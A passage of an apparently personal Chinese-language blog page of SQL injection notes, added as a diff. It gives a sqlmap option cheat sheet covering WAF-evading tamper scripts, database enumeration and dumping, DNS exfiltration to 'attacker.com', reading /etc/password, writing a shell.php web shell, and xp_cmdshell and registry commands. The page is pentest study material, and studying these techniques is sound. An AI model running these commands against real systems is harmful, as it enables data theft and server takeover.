+<li><code>sqlmap -u &quot;http://1.1.1.1/sqlmap/mysql/get_str_brackets.php?id=1&quot; -p id--prefix &quot;’)&quot; --suffix &quot;AND (’abc’=’abc“</code></li>
+<li><code>query = &quot;SELECT * FROM users WHERE id=(’1’) &lt;PAYLOAD&gt; AND(’abc’=’abc’) LIMIT 0, 1&quot;;</code></li>
+</ul>
+</li>
+<li><p>–tamper</p>
+</li>
+<li><ul>
+<li>混淆脚本，用于绕过应用层过滤，IPS，WAF</li>
+<li><code>sqlmap -u “http://1.1.1.1/a.php?id=1” --tamper=&quot;tamper/between.py,tamper/randomcase.py,tamper/space2comment.py&quot; -v 3</code></li>
+</ul>
+</li>
+<li><p>–level</p>
+</li>
+<li><ul>
+<li>1-5级</li>
+<li>/usr/share/sqlmap/xml/payloads</li>
+</ul>
+</li>
+<li><p>–risk</p>
+</li>
+<li><ul>
+<li>risk升高可造成数据被篡改等风险</li>
+</ul>
+</li>
+<li><p>–string –not-string –regexp –code –text-only –titles</p>
+</li>
+<li><ul>
+<li>页面比较，基于布尔的注入检测，依据返回页面内容的变化判断真假逻辑，但有些页面随时间阈值变化，此时需要人为指定标识真假的字符串</li>
+</ul>
+</li>
+<li><p>默认使用全部技术</p>
+</li>
+<li><ul>
+<li>B: Boolean-based blind<br>E: Error-based<br>U: Union query-based<br>S: Stacked queries<br>T: Time-based blind</li>
+</ul>
+</li>
+<li><p>–time-sec</p>
+</li>
+<li><ul>
+<li>基于时间的注入检测相应延迟时间</li>
+</ul>
+</li>
+<li><p>–union-cols</p>
+</li>
+<li><ul>
+<li>默认联合查询1-10列，随–level增加最多支持50列</li>
+<li>–union-cols 6-9</li>
+</ul>
+</li>
+<li><p>–union-char</p>
+</li>
+<li><ul>
+<li>联合查询默认使用NULL，极端情况下NULL可能失败，此时可以手动指定数值</li>
+<li>–union-char 123</li>
+</ul>
+</li>
+<li><p>–dns-domain</p>
+</li>
+<li><ul>
+<li>攻击者控制了某DNS服务器，使用此功能可以提高数据榨取的速度</li>
+<li>–dns-domain attacker.com</li>
+</ul>
+</li>
+<li><p>–second-order</p>
+</li>
+<li><ul>
+<li>在一个页面注入的结果，从另一个页面体现出来</li>
+<li>–second-order <a href="http://1.1.1.1/b.php" target="_blank" rel="noopener">http://1.1.1.1/b.php</a></li>
+</ul>
+</li>
+<li><p>-f, –fingerprint, -b , –banner</p>
+</li>
+<li><ul>
+<li>数据库管理系统指纹信息</li>
+<li>DBMS，操作系统，架构，补丁</li>
+</ul>
+</li>
+<li><p>ENUMERATION</p>
+</li>
+<li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">--current-user</span><br><span class="line">--current-db</span><br><span class="line">--hostname</span><br><span class="line">--users</span><br><span class="line">--privileges -U username </span><br><span class="line">--roles</span><br><span class="line">--dbs</span><br><span class="line">--tables, --exclude-sysdbs –D dvwa</span><br><span class="line">-T users -D dvwa -C user --columns</span><br><span class="line">--schema --batch --exclude-sysdbs 元数据（使用默认选项）</span><br><span class="line">--count</span><br><span class="line">Dump数据</span><br><span class="line">--dump, -C, -T, -D, --start, --stop</span><br><span class="line">--dump-all --exclude-sysdbs</span><br><span class="line">--sql-query &quot;select * from users&quot;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>BRUTE FORCE</p>
+</li>
+<li><ul>
+<li>MySQL &lt; 5.0 没有information_schema 库</li>
+<li>MySQL &gt;= 5.0  但无权读取information_schema库</li>
+<li>微软的access数据库 ，默认无权读取MSysObjects库</li>
+<li>–common-tables</li>
+<li>–common-columns</li>
+</ul>
+</li>
+<li><p>–udf-inject ,–shared-lib</p>
+</li>
+<li><ul>
+<li><code>http://www.slideshare.net/inquis/advanced-sql-injection-to-operating-system-full-control-whitepaper-4633857</code></li>
+</ul>
+</li>
+<li><p>–file-read = “/etc/password”</p>
+</li>
+<li><p>–file-write=”shell.php” –file-dest “/tmp/shell.php”</p>
+</li>
+<li><p>MySQL，postgresql</p>
+</li>
+<li><ul>
+<li>上传共享库并生成sys_exec(),sys_eval()两个UDF</li>
+</ul>
+</li>
+<li><p>mssql</p>
+</li>
+<li><ul>
+<li>xp_cmdshell存储过程</li>
+</ul>
+</li>
+<li><p>Windows registory</p>
+</li>
+<li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">--reg-read</span><br><span class="line">--reg-add</span><br><span class="line">--reg-del</span><br><span class="line">--reg-key?--reg-value?--reg-data?--reg-type</span><br><span class="line">sqlmap –u=&quot;http://1.1.1.1/a.aspx?id=1&quot; --reg-add --reg-</span><br><span class="line">key=&quot;HKEY_LOCAL_MACHINE\SOFTWARE\sqlmap&quot; --reg-value=Test --</span><br><span class="line">reg-type=REG_SZ --reg-data=1</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>-s : sqlite会话文件保存位置</p>
+</li>
+<li><p>-t: 记录流量文件保存位置</p>
+</li>
+<li><p>–charset:强制字符编码</p>
+</li>
+<li><p>–crawl：从起始位置爬站深度</p>
+</li>
+<li><p>–csv-del：dump数据默认存于“，”分割的csv文件中，指定其他分隔符</p>
+</li>
+<li><p>–dbms-cred：指定数据库账号</p>
+</li>
+<li><p>–flush-session：清空session</p>
+</li>
+<li><p>–force-ssl</p>
+</li>
+<li><p>–fresh-queries:忽略session查询结果</p>
+</li>
+<li><p>–hex:dump非ASCII字符内容时，将其编码为16进制形式，收到后解码还原</p>
+</li>
+<li><p>–output-dir=/tmp</p>
+</li>
+<li><p>–parse-errors:分析和显示数据库内建报错信息</p>
+</li>
+<li><p>–save:将命令保存成配置文件</p>
+</li>
+<li><p>MISCELLANEOUS</p>
+</li>
+<li><ul>
+<li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">-z 参数注记符</span><br><span class="line">sqlmap --batch --random-agent --ignore-proxy --technique=BEU -u</span><br><span class="line">“1.1.1.1/a.php?id=1&quot;</span><br><span class="line">sqlmap -z &quot;bat,randoma,ign,tec=BEU&quot; -u “1.1.1.1/a.php?id=1&quot;</span><br><span class="line">sqlmap --ignore-proxy --flush-session --technique=U --dump -D testdb -T</span><br><span class="line">users -u “1.1.1.1/a.php?id=1&quot;</span><br><span class="line">sqlmap -z &quot;ign,flu,bat,tec=U,dump,D=testdb,T=users&quot; -u “1.1.1.1/</span><br><span class="line">vuln.php?id=1“</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>–answer</p>
+</li>
+<li><p>–check-waf: 检测WAF/IPS/IDS</p>
+</li>
+<li><p>–hpp: HTTP parameter pollution</p>
+</li>
+<li><ul>
+<li>绕过WAF/IPS/IDS的有效方法</li>
+<li>尤其对ASP/IIS 和 ASP.NET/IIS</li>
+</ul>
+</li>
+<li><p>–identify-waf：彻底的WAF/IPS/IDS检查</p>
+</li>
+<li><p>–mobile: 模拟智能手机设备</p>
+</li>
+<li><p>–purge-output：清除output文件夹</p>
+</li>
+<li><p>–smart：当有大量检测目标时，只选择基于错误的检测结果</p>
+</li>
+<li><p>–wizard</p>
+</li>
+</ul>
+</li>
+</ul>
+
+  </div>
+</article>
+
+
+
+    </div>
+    
+      <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Inici</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/Search/">Buscar</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL注入笔记"><span class="toc-number">1.</span> <span class="toc-text">SQL注入笔记</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL盲注"><span class="toc-number">1.1.</span> <span class="toc-text">SQL盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQLMAP-自动注入"><span class="toc-number">1.2.</span> <span class="toc-text">SQLMAP 自动注入</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2018/04/21/SQL注入笔记/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2018/04/21/SQL注入笔记/&text=SQL注入笔记"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2018/04/21/SQL注入笔记/&title=SQL注入笔记"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2018/04/21/SQL注入笔记/&is_video=false&description=SQL注入笔记"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=SQL注入笔记&body=Check out this article: http://yoursite.com/2018/04/21/SQL注入笔记/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2018/04/21/SQL注入笔记/&title=SQL注入笔记"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2018/04/21/SQL注入笔记/&title=SQL注入笔记"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2018/04/21/SQL注入笔记/&title=SQL注入笔记"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2018/04/21/SQL注入笔记/&title=SQL注入笔记"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2018/04/21/SQL注入笔记/&name=SQL注入笔记&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menú</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Compartir</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Cap amunt</a>
+    </div>
+
+  </div>
+</div>
+
+    
+    <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2018 jsmhny
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Inici</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/Search/">Buscar</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+</body>
+</html>
+<!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/fontawesome-all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+<!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
